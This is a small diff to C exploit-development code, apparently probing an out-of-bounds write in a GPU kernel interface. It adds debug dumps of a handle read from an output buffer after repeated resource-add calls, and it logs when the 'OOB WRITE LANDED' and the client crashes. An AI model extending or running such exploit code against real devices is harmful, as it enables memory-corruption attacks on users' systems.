@@ -669,7 +669,17 @@ void nk_iogpu_group_oob_run(int trigger)
                 grp_dump_handle(gh, "geo");
             }
             int a1 = call_sel(conn, CMD_ADD_RES, id, 1, 0, 0, o6, &on6);
+            {
+                uint64_t gh2 = 0;
+                memcpy(&gh2, o6 + 0x10, 8);
+                grp_dump_handle(gh2, "after-add1");
+            }
             int a2 = call_sel(conn, CMD_ADD_RES, id, 1, 0, 0, o6, &on6);
+            {
+                uint64_t gh3 = 0;
+                memcpy(&gh3, o6 + 0x10, 8);
+                grp_dump_handle(gh3, "after-add2");
+            }
             ol("[grp] geo[%u] id=%u add1=0x%x add2=0x%x%s", gi, id, a1, a2,
                (a2 == (int)0x10000003) ? "  *** CLIENT DIED - OOB WRITE LANDED ***" : "");
             if (a2 == (int)0x10000003) { ol("[grp] dead at geo[%u]", gi); break; }
